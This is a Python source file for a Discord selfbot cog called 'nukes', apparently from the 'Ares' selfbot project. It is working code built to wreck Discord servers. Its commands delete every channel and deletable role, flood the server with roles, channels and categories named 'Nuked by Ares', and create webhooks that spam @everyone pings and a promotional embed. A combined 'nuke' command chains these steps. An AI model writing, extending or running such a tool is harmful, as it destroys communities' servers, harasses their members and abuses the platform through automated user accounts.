import logging
import os

import discord
from discord.ext import commands
import json
from discord_webhook import DiscordWebhook, DiscordEmbed

# Cross platfrom terminal colors
red = "\033[31m"
green = "\033[32m"
cyan = "\033[36m"
purple = "\033[95m"
reset = "\033[0m"
bold = "\033[1m"
underline = "\033[4m"

class nukes(commands.Cog):
    """All hail Ares, for he is the god that will win wars with sheer brutality."""
    def __init__(self, bot):
        self.bot = bot

    # Mass role creation
    @commands.command()
    async def rolecreate(self, ctx, *, role_name = "Nuked by Ares | vrc.gay/Ares"):
        """Mass role creation
        
        Paramaters
        • role_name - The name of the role you wish to create
        """
        logging.info("Starting mass role creation")
        logging.info("Using name: %s" % role_name)


        # Oooo so sexy and compact code
        for i in range(0, 24):
            try:
                await ctx.guild.create_role(name=role_name)
                logging.info("Created role: %s" % role_name) 
            except Exception as e:
                logging.error("Failed to create role")
                logging.error(e)
                break
    

    # Mass role deletion
    @commands.command()
    async def roledelete(self, ctx):
        """Mass role deletion"""
        logging.info("Starting role deletion")

        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                try:
                    await role.delete()
                    logging.info("Deleted role: %s" % role)
                except Exception as e:
                    logging.error("Failed to delete role %s" % role)
                    logging.error(e)
                    break

    
    # Channels section
    
    # Spam channels
    @commands.command()
    async def channelcreate(self, ctx, *, channel_name="Nuked by Ares | vrc.gay/Ares"):
        """Spams channels ok cool

        Paramaters
        • channel_name - The name of the channels you wanna create
        """
        logging.info("Starting channel creation")
        for i in range(0, 24):
            # Create text chat
            try:
                await ctx.guild.create_text_channel(channel_name)
                logging.info("Created text channel %s" % channel_name)
            except Exception as e:
                logging.error("Failed to create channel %s" % channel_name)
                
                # Abort loop
                break
            
            # Create voice channel
            try:
                await ctx.guild.create_voice_channel(channel_name)
                logging.info("Created voice channel: %s" % channel_name)
            except Exception as e:
                logging.error("Failed to create voice chat: %s" % channel_name)
                logging.error("Error " + e)

                # Abort loop
                break
            
            # Create category
            try:
                await ctx.guild.create_category(channel_name)
                logging.info("Created category %s " % channel_name)
            except Exception as e:
                logging.error("Failed to create category %s " % channel_name)
                logging.error("Error: " + e)
                
                # Abort loop
                break

    # Delete channels
    @commands.command()
    async def channeldelete(self, ctx):
        """Deletes all the channels, voice channels and categories"""
        deleted = 0 
        logging.info("Starting channel deletion")

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                deleted += 1
                logging.info("Deleted channel: %s " % channel)
            except Exception as e:
                logging.error("Could not delete channel: %s" % channel)
                logging.error("Error: " + e)
                break
        logging.info(f"Deleted ${str(deleted)} channels")

    @commands.command()
    async def webhook(self, ctx, *, name = "Nuked by Ares | vrc.gay/Ares"):
        """Creates a shitload of webhooks and does shit"""

        # Check if data/nuker exists if not create the folder
        def checkFolder():
            if not os.path.exists("data/nuker"):
                # create folder
                os.makedirs("data/nuker")
                # Create webhooks.json
                with open("data/nuker/webhooks.json", "w") as f:
                    json.dump({}, f)
                    logging.info("First time use for nuker finished")


        # Overwrites contents of old data/nuker/webhooks.json
        # With default information: {"webhooks": []}        
        def overwrite(filename="data/nuker/webhooks.json"):
            with open(filename, "w") as f:
                f.write(json.dumps({"webhooks": []}))
                f.truncate()

        checkFolder()
        overwrite()
        logging.info("Starting webhook creation")
        i = 0 # If this goes above 23 you get ratelimited so break the command there
        def writeJson(newData, filename="data/nuker/webhooks.json"):
            with open(filename, "r+") as f:
                fileData = json.load(f)
                # Join new data with fileData inside 
                fileData["webhooks"].append(newData)
                f.seek(0)
                json.dump(fileData, f)

        # Grab each channel in the guild
        for channel in ctx.guild.channels:
            # Check if channel is a text channel
            if channel.type == discord.ChannelType.text:
                if i < 23:
                    try:
                        # Attempt to create the webhook
                        webhook = await channel.create_webhook(name = name)
                        logging.info(f"Created webhook: {name} | ID: {webhook.id}")
                        writeJson({"webhook": webhook.url})
                        i += 1

                    except Exception as e:
                        logging.error("Failed to create webhook")
                        logging.error(e)    
                        break
                else:
                    logging.info("Stopping the webhook creation to avoid ratelimit")
                    pass

        # Load all the webhooks from data/nuker/webhooks.json
        webhooks = json.load(open("data/nuker/webhooks.json", "r"))["webhooks"]
        for webhook in webhooks:
            # extract webhook url 
            url = webhook["webhook"]
            # Attempt to send a message to each webhook
            try:
                # Create webhook object
                webhook = DiscordWebhook(url=url)

                # Create embed
                embed = DiscordEmbed(title="Nuked by Ares | vrc.gay/Ares", description="<@everyone>")
                embed.set_image(url="https://i.imgur.com/ob8Mb1U.png")
                embed.set_footer(text="Ares | The number 1 free selfbot")
                embed.set_author(name="Ares", url="https://github.com/GoByeBye/Ares")

                # add embed to webhook object
                webhook.add_embed(embed)
                webhook.execute()
                logging.info("Sent webhook request to: %s" % webhook.url)

                # Ping everyone in the guild
                webhook = DiscordWebhook(url=url, content="@everyone")
                webhook.execute()
                logging.info("Pinged everyone")
            except Exception as e:
                logging.error(e)
                pass

    # Does all of the commands above to leave a wasteland
    @commands.command()
    async def nuke(self, ctx, *, name = "Nuked by Ares | vrc.gay/Ares"):
        """Nukes the server
        
        Paramaters
        • name - Names of the roles and channels Ares will make
        """
        async def channelDelete(self, ctx):
            deletedChannels = 0
            logging.info("Starting channel deletion")

            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    deletedChannels += 1
                    logging.info("Deleted channel: %s " % channel)
                except Exception as e:
                    logging.error("Could not delete channel: %s" % channel)
                    logging.error("Error: " + e)
                    break
            logging.info(f"Deleted ${str(deletedChannels)} channels")
            
        
        
        async def roleDelete(self, ctx):
            deletedRoles = 0
            logging.info("Starting role deletion")

            roles = ctx.guild.roles
            roles.pop(0)
            for role in roles:
                if ctx.guild.roles[-1] > role:
                    try:
                        await role.delete()
                        deletedRoles += 1
                        logging.info("Deleted role: %s" % role)
                    except Exception as e:
                        logging.error("Failed to delete role %s" % role)
                        logging.error(e)
                        break

            logging.info(f"Deleted ${str(deletedRoles)} roles")

        async def channelCreate(self, ctx, name):
            logging.info("Starting channel creation")
            for i in range(0, 24):
                # Create text chat
                try:
                    await ctx.guild.create_text_channel(name)
                    logging.info("Created text channel %s" % name)
                except Exception as e:
                    logging.error("Failed to create channel %s" % name)
                    
                    # Abort loop
                    break
                
                # Create voice channel
                try:
                    await ctx.guild.create_voice_channel(name)
                    logging.info("Created voice channel: %s" % name)
                except Exception as e:
                    logging.error("Failed to create voice chat: %s" % name)
                    logging.error("Error " + e)

                    # Abort loop
                    break
                
                # Create category
                try:
                    await ctx.guild.create_category(name)
                    logging.info("Created category %s " % name)
                except Exception as e:
                    logging.error("Failed to create category %s " % name)
                    logging.error("Error: " + e)
                    
                    # Abort loop
                    break

        async def roleCreate(self, ctx, name):
            logging.info("Starting role creation")
            for i in range(0, 24):
                # Create role
                try:
                    await ctx.guild.create_role(name=name)
                    logging.info("Created role: %s" % name)
                except Exception as e:
                    logging.error("Failed to create role")
                    logging.error(e)
                    break

    

        # Start nuking
        await roleDelete(self, ctx)
        await roleCreate(self, ctx, name)
        await channelDelete(self, ctx)
        await channelCreate(self, ctx, name)

        logging.info("Finished nuking")

def setup(bot):
    bot.add_cog(nukes(bot))
